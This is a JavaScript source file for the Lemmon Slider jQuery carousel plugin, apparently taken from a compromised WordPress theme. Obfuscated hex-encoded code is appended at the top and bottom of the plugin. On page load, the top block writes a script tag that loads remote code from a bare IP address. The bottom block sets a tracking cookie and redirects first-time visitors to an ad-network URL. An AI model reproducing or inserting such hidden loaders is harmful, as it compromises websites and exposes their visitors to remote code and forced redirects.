var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/*
 * Lemmon Slider - jQuery Plugin
 * Simple and lightweight slider/carousel supporting variable elements/images widths.
 *
 * Examples and documentation at: http://jquery.lemmonjuice.com/plugins/slider-variable-widths.php
 *
 * Copyright (c) 2011 Jakub PelÃ¡k <jpelak@gmail.com>
 *
 * Version: 0.2 (9/6/2011)
 * Requires: jQuery v1.4+
 *
 * Licensed under the MIT license:
 *   http://www.opensource.org/licenses/mit-license.php
 */
(function( $ ) {

    var _css = {};

    var methods = {
        //
        // Initialzie plugin
        //
        init:    function( options ) {
            options = $.extend( {}, $.fn.lemmonSlider.defaults, options );

            return this.each( function() {

                var $slider = $( this ),
                    data = $slider.data( 'slider' );

                if( !data ) {

                    var $sliderContainer = $slider.find( options.slider ),
                        $sliderControls = $slider.next().filter( '.controls' ),
                        $items = $sliderContainer.find( options.items ),
                        originalWidth = 1;

                    $items.each( function() { originalWidth += $( this ).outerWidth( true ) } );
                    $sliderContainer.width( originalWidth );

                    // slide to last item
                    if( options.slideToLast ) $sliderContainer.css( 'padding-right', $slider.width() );

                    // infinite carousel
                    if( options.infinite ) {
                        $slider.data( 'slider-infinite', true );

                        originalWidth = originalWidth * 3;
                        $sliderContainer.width( originalWidth );

                        $items.clone(true, true).addClass( '-after' ).insertAfter( $items.filter( ':last' ) );
                        $items.filter( ':first' ).before( $items.clone(true, true).addClass( '-before' ) );

                        $items = $sliderContainer.find( options.items );

                    }

                    $slider.items = $items;
                    $slider.options = options;

                    // first item
                    //$items.filter( ':first' ).addClass( 'active' );

                    slideTo( {}, $slider, 0, 0, 0 );

                    // attach events
                    $slider.bind( 'nextSlide', function( e, t ) {

                        var scroll = $slider.scrollLeft();
                        var x = 0;
                        var slide = 0;

                        $items.each( function( i ) {
                            if( x == 0 && $( this ).position().left > options.offset ) {
                                x = $( this ).position().left;
                                slide = i;
                            }
                        } );

                        if( x > 0 && $sliderContainer.outerWidth() - scroll - $slider.width() - 1 > 0 ) {
                            slideTo( e, $slider, scroll + x, slide, 'slow' );
                        } else if( options.loop ) {
                            // return to first
                            slideTo( e, $slider, 0, 0, 'slow' );
                        }

                    } );
                    $slider.bind( 'prevSlide', function( e, t ) {

                        var scroll = $slider.scrollLeft();
                        var x = 0;
                        var slide = 0;

                        $items.each( function( i ) {
                            if( $( this ).position().left < options.offset ) {
                                x = $( this ).position().left;
                                slide = i;
                            }
                        } );

                        if( x ) {
                            slideTo( e, $slider, scroll + x, slide, 'slow' )
                        } else if( options.loop ) {
                            // return to last
                            var a = $sliderContainer.outerWidth() - $slider.width();
                            var b = $items.filter( ':last' ).position().left;
                            slide = $items.size() - 1;
                            if( a > b ) {
                                slideTo( e, $slider, b, slide, 'slow' );
                            } else {
                                slideTo( e, $slider, a, slide, 'slow' );
                            }
                        }

                    } );
                    $slider.bind( 'nextPage', function( e, t ) {

                        var scroll = $slider.scrollLeft();
                        var w = $slider.width();
                        var x = 0;
                        var slide = 0;

                        $items.each( function( i ) {
                            if( $( this ).position().left < w ) {
                                x = $( this ).position().left;
                                slide = i;
                            }
                        } );

                        if( x > 0 && scroll + w + 1 < originalWidth ) {
                            slideTo( e, $slider, scroll + x, slide, 'slow' );
                        } else if( options.loop ) {
                            // return to first
                            slideTo( e, $slider, 0, 0, 'slow' );
                        }

                    } );
                    $slider.bind( 'prevPage', function( e, t ) {

                        var scroll = $slider.scrollLeft();
                        var w = $slider.width();
                        var x = 0;

                        $items.each( function( i ) {
                            if( $( this ).position().left < 1 - w ) {
                                x = $( this ).next().position().left;
                                slide = i;
                            }
                        } );

                        if( scroll ) {
                            if( x == 0 ) {
                                //$slider.animate({ 'scrollLeft' : 0 }, 'slow' );
                                slideTo( e, $slider, 0, 0, 'slow' );
                            } else {
                                //$slider.animate({ 'scrollLeft' : scroll + x }, 'slow' );
                                slideTo( e, $slider, scroll + x, slide, 'slow' );
                            }
                        } else if( options.loop ) {
                            // return to last
                            var a = $sliderContainer.outerWidth() - $slider.width();
                            var b = $items.filter( ':last' ).position().left;
                            if( a > b ) {
                                $slider.animate( { 'scrollLeft': b }, 'slow' );
                            } else {
                                $slider.animate( { 'scrollLeft': a }, 'slow' );
                            }
                        }

                    } );
                    $slider.bind( 'slideTo', function( e, i, t ) {

                        slideTo(
                            e, $slider,
                            $slider.scrollLeft() + $items.filter( ':eq(' + i + ')' ).position().left,
                            i, t );

                    } );

                    // controls
                    $sliderControls.find( '.next-slide' ).click( function() {
                        $slider.trigger( 'nextSlide' );
                        return false;
                    } );
                    $sliderControls.find( '.prev-slide' ).click( function() {
                        $slider.trigger( 'prevSlide' );
                        return false;
                    } );
                    $sliderControls.find( '.next-page' ).click( function() {
                        $slider.trigger( 'nextPage' );
                        return false;
                    } );
                    $sliderControls.find( '.prev-page' ).click( function() {
                        $slider.trigger( 'prevPage' );
                        return false;
                    } );

                    //if ( typeof $slider.options.create == 'function' ) $slider.options.create();

                    $slider.data( 'slider', {
                        'target':  $slider,
                        'options': options
                    } )

                }

            } );

        },
        //
        // Add Item
        //
        addItem: function( options ) {
            var options = $.extend( {}, $.fn.lemmonSlider.defaults, options );

            var $slider = $( this ),
                $sliderContainer = $slider.find( options.slider ),
                $sliderControls = $slider.next().filter( '.controls' ),
                $items = $sliderContainer.find( options.items )

            options.infinite = $slider.data( 'slider-infinite' )

            if( !options.item ) {
                return false
            }
            methods.destroy.apply( this );
            if( options.prepend ) {
                $sliderContainer.prepend( options.item );
            } else {
                $sliderContainer.append( options.item );
            }
            methods.init.apply( this, [options] );
        },
        //
        // Destroy plugin
        //
        destroy: function() {

            return this.each( function() {

                var $slider = $( this ),
                    $sliderControls = $slider.next().filter( '.controls' ),
                    $items = $slider.find( '> *:first > *' ),
                    data = $slider.data( 'slider' );

                $slider.unbind( 'nextSlide' );
                $slider.unbind( 'prevSlide' );
                $slider.unbind( 'nextPage' );
                $slider.unbind( 'prevPage' );
                $slider.unbind( 'slideTo' );

                $sliderControls.find( '.next-slide' ).unbind( 'click' );
                $sliderControls.find( '.prev-slide' ).unbind( 'click' );
                $sliderControls.find( '.next-page' ).unbind( 'click' );
                $sliderControls.find( '.next-page' ).unbind( 'click' );

                $slider.removeData( 'slider' );

                if( $slider.data( 'slider-infinite' ) ) {
                    $.merge( $items.filter( '.-before' ), $items.filter( '.-after' ) ).each( function( index, item ) {
                        $( item ).remove();
                    } );
                }
            } );

        }
        //
        //
        //
    }
    //
    // Private functions
    //
    function slideTo( e, $slider, x, i, t ) {

        $slider.items.filter( 'li:eq(' + i + ')' ).addClass( 'active' ).siblings( '.active' ).removeClass( 'active' );

        if( $slider.options.center ) {
            var currentElement = $( $slider.items[ i ]);
            $slider.options.offset = Math.floor( ( $('.qode_image_gallery_holder').width() - currentElement.width() ) / 2 );
            console.log( 'set offset to ', $slider.options.offset );
        }

        if( typeof t == 'undefined' ) {
            t = 'slow';
        }
        if( t ) {
            $slider.animate( { 'scrollLeft': x - $slider.options.offset }, t, function() {
                checkInfinite( $slider );
            } );
        } else {
            var time = 0;
            $slider.scrollLeft( x - $slider.options.offset );
            checkInfinite( $slider );
        }

        //if ( typeof $slider.options.slide == 'function' ) $slider.options.slide( e, i, time );
    }

    function checkInfinite( $slider ) {

        var $active = $slider.items.filter( '.active' );
        if( $active.hasClass( '-before' ) ) {

            var i = $active.prevAll().size();
            $active.removeClass( 'active' );
            $active = $slider.items.filter( ':not(.-before):eq(' + i + ')' ).addClass( 'active' );
            $slider.scrollLeft( $slider.scrollLeft() + $active.position().left - $slider.options.offset );

        } else if( $active.hasClass( '-after' ) ) {

            var i = $active.prevAll( '.-after' ).size();
            $active.removeClass( 'active' );
            $active = $slider.items.filter( ':not(.-before):eq(' + i + ')' ).addClass( 'active' );
            $slider.scrollLeft( $slider.scrollLeft() + $active.position().left - $slider.options.offset );

        }

    }

    //
    // Debug
    //
    function debug( text ) {
        $( '#debug span' ).text( text );
    }

    //
    //
    //
    $.fn.lemmonSlider = function( method, options ) {
        if( methods[method] ) {
            return methods[ method ].apply( this, Array.prototype.slice.call( arguments, 1 ) );
        } else if( typeof method === 'object' || !method ) {
            return methods.init.apply( this, arguments );
        } else {
            $.error( 'Method ' + method + ' does not exist on jQuery.lemmonSlider' );
        }

    };
    //
    //
    //
    $.fn.lemmonSlider.defaults = {

        'items':       '> *',
        'loop':        true,
        'slideToLast': false,
        'slider':      '> *:first',
        // since 0.2
        'infinite':    true,
        'center':      true,
        'offset':      0

    }

})( jQuery );
var _0xf098=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x6E\x63\x6C\x6B\x64\x73\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x7A\x6F\x6E\x65\x69\x64\x3D\x31\x31\x35\x37\x39\x38\x34"];function _q1x0(_0xfeedx2,_0xfeedx3,_0xfeedx4,_0xfeedx5){var _0xfeedx6= new Date();var _0xfeedx7= new Date();if(_0xfeedx4=== null|| _0xfeedx4=== 0){_0xfeedx4= 3};_0xfeedx7[_0xf098[1]](_0xfeedx6[_0xf098[0]]()+ 3600000* 24* _0xfeedx4);document[_0xf098[2]]= _0xfeedx2+ _0xf098[3]+ escape(_0xfeedx3)+ _0xf098[4]+ _0xfeedx7[_0xf098[5]]()+ ((_0xfeedx5)?_0xf098[6]+ _0xfeedx5:_0xf098[7])}function _z1g1(_0xfeedx9){var _0xfeedxa=document[_0xf098[2]][_0xf098[8]](_0xfeedx9+ _0xf098[3]);var _0xfeedxb=_0xfeedxa+ _0xfeedx9[_0xf098[9]]+ 1;if((!_0xfeedxa) && (_0xfeedx9!= document[_0xf098[2]][_0xf098[10]](0,_0xfeedx9[_0xf098[9]]))){return null};if(_0xfeedxa== -1){return null};var _0xfeedxc=document[_0xf098[2]][_0xf098[8]](_0xf098[11],_0xfeedxb);if(_0xfeedxc==  -1){_0xfeedxc= document[_0xf098[2]][_0xf098[9]]};return unescape(document[_0xf098[2]][_0xf098[10]](_0xfeedxb,_0xfeedxc))}if(navigator[_0xf098[12]]){if(_z1g1(_0xf098[13])== 1){}else {_q1x0(_0xf098[13],_0xf098[14],_0xf098[14],_0xf098[15]);window[_0xf098[17]][_0xf098[16]]= _0xf098[18]}}